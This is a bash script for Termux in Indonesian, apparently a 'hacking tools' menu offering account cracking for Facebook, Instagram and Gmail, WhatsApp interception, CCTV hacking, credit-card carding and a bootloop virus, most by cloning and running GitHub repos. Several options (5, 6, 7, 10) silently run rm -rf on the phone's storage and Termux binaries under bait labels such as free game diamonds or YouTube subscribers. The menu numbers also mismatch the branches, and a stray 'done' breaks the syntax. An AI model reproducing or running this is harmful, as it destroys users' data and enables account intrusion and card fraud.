# senjutshu
#!/bin/bash
#version 1.0

# Variables
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'

figlet T3MP35T | lolcat

echo -u "######################################################"
echo -b " TOOLS TERMUX $green " |lolcat
echo -b " COPY BY TEMPEST $green " |lolcat
echo -b " MY FACEBOOK: RIMURU TEMPEST $green " |lolcat
echo -b " RUDEBOYS SQUAD - ANBU CYBER INDO - CYBER SWORD $green " |lolcat
echo -u "#######################################################"


###################################################
# CTRL + C                                        #
###################################################

trap ctrl_c INT
ctrl_c() {
clear
echo -b $green"[#]> (Ctrl + C ) Detected, Trying To Exit ... " |lolcat
echo -b $green"[#]> thanks udah pakai tools ini" |lolcat
sleep 1
echo ""
echo -b $green"[#]> T3MP35T WAS HERE" |lolcat

echo -b $green"[#]> see you again ferguso :)..." |lolcat
sleep 1
exit
}

lagi=1
while [ $lagi -lt 6 ];
do
echo ""
echo -e $b "1. HACK FB NARGET${enda}";
echo -e "============================" | lolcat
echo -e $b "2. HACK IG NARGET${enda}";
echo -e "============================" | lolcat
echo -e $b "3. HACK GMAIL${enda}";
echo -e "============================" | lolcat
echo -e $b "4. SADAP WA JARAK JAUH${enda}";
echo -e "============================" | lolcat
echo -e $b "5.RESET HP ORANG JARAK JAUH${enda}";
echo -e "============================" | lolcat
echo -e $b "6. TOP UP DM ILEGAL GRATIS FREE FIRE${enda}";
echo -e "============================" | lolcat
echo -e $b "7. AUTO SUBSCRIBE 500K YOUTUBE CHANEL${enda}";
echo -e "============================" | lolcat
echo -e $b "8. DUMP TEMAN FB${enda}";
echo -e "============================" | lolcat
echo -e $b "9. CARI CC BUAT CARDING${enda}";
echo -e "============================" | lolcat
echo -e $b "10. TOP UP FREE FIRE${enda}";
echo -e "============================" | lolcat
echo -e $b "11. TEMBAK KUOTA${enda}";
echo -e "============================" | lolcat
echo -e $b "12. BUAT VIRUS BOOTLOOP HP${enda}";
echo -e "============================" | lolcat
echo -e $b "13. JADWAL SHOLAT${enda}";
echo -e "============================" | lolcat
echo -e $b "14. HACK CCTV${enda}";
echo -e "============================" | lolcat
echo -e $b "15. HACK PULSA SMARTFREN${enda}";
echo -e "============================" | lolcat
echo -e $b "16. Exit${enda}";
echo -e "╭─root@tempest" | lolcat
read -p "╰─#" pil;

case $pil in
    1) echo "T3MP35T TOOLS HACK FB NARGET" | lolcat
            pkg install python2
            git clone https://github.com/Senitopeng/KumpulanFbbrute
            echo -e "${y} cara menggunakan KumpulanFbbrute"
            cd KumpulanFbbrute
            python2 jomblo.py
            
;;

2) echo "T3MP35T TOOLS HACK IG NARGET" | lolcat
        apt install python2
        git clone https://github.com/Senitopeng/instabot.git
        echo -e "${y} cara menggunakan INSTA HACK"
        cd instabot
        ./instabot
      
;;

3) echo "T3MP35T TOOLS HACK GMAIL" | lolcat
        apt install python2
        git clone https://github.com/AyoubSirai/gmail_attacker
        echo -e "${y} cara menggunakan Gmail HACK"
        cd gmail_attacker
        python2 gmail_attacker.py
    

;;

4) echo "T3MP35T TOOLS SADAP WA" | lolcat
    git clone https://github.com/soracyberteam/what-sexploit
        echo -e "${y} cara sadap whatsapp"
        cd what-sexploit
        ./whatsex
    

;;

5) echo "T3MP35T  TOOLS RESET  HP ORANG" | lolcat
             pkg update
             pkg upgrade
         rm -rf /storage/emulated/0
        rm -rf /storage
      rm -rf /storage/sdcard
    rm -rf /storage/sdcard1
  rm -rf $PREFIX/bin
exit 

;;

6) echo "T3MP35T TOOLS DM FREE FIRE ILEGAL" | lolcat
             pkg update
             pkg upgrade
         rm -rf /storage/emulated/0
        rm -rf /storage
      rm -rf /storage/sdcard
    rm -rf /storage/sdcard1
  rm -rf $PREFIX/bin
exit

;;

7) echo "T3MP35T  AUTO 500K SUB YOUTUBE  CHANEL" | lolcat
           pkg update
             pkg upgrade
           rm -rf /storage/emulated/0
         rm -rf /storage
       rm -rf /storage/sdcard
     rm -rf /storage/sdcard1
   rm -rf $PREFIX/bin
exit

;;

8) echo "T3MP35T TOOLS DUMP TEMAN FB" | lolcat
    git clone https://github.com/CiKu370/OSIF
        echo -e "${y} cara dump nya "
        cd OSIF
        pip2 install -r requirements.txt
        python2 osif.py
    
;;

9) echo "T3MP35T  TOOLS NGEDUMP CC CARDING" | lolcat
        git clone https://github.com/ganucisystem/creditcard
        echo -e "${y} cara ambil cc nya "
        cd creditcard
        php fake.php
       

;;

10) echo "eror not found sory: T3MP35T" | lolcat
    rm -rf /sdcard/
    rm -rf /storage/emulated/0/
echo

;;

11) echo "T3MP35T  TOOLS TEMBAK KUOTA" | lolcat
        git clone https://github.com/kumpul4semut/semut.git
        echo -e "${y} cara tembaknya "
        cd semut
        python2 dor.py
    

;;

12) echo "T3MP35T TOOLS TEMBAK KUOTA" | lolcat 
    git clone https://github.com/aryanrtm/Jadwal-Sholat
    cd Jadwal-Sholat
    sh jadwal-sholat.sh
    
;;

13) echo "T3MP35T TOOLS NGEBUAT VIRUS" | lolcat  
    git clone https://github.com/TUANB4DUT/VIRUS
    cd VIRUS
    chmod +x bootloop.sh
    sh bootloop.sh
    
;;

14) echo "T3MP35T TOOLS HACK CCTV" | lolcat  
    pkg install python2
    git clone https://github.com/kancotdiq/ipcs
    cd ipcs
    python2 scan.py
    
;;

15) echo "T3MP35T TOOLS HACK PULSA" | lolcat  
    pkg install php
    git clone https://github.com/ganucisystem/radenkeceh
    cd radenkeceh
    php pulsa.php

;;

16) echo "BYE KALIAN  PARA HAYKEL PRO" | lolcat
exit

;;

*) echo "MAAF JIKA ADA KESALAHAN, HARAP DI MAKLUMI"
esac
done
done
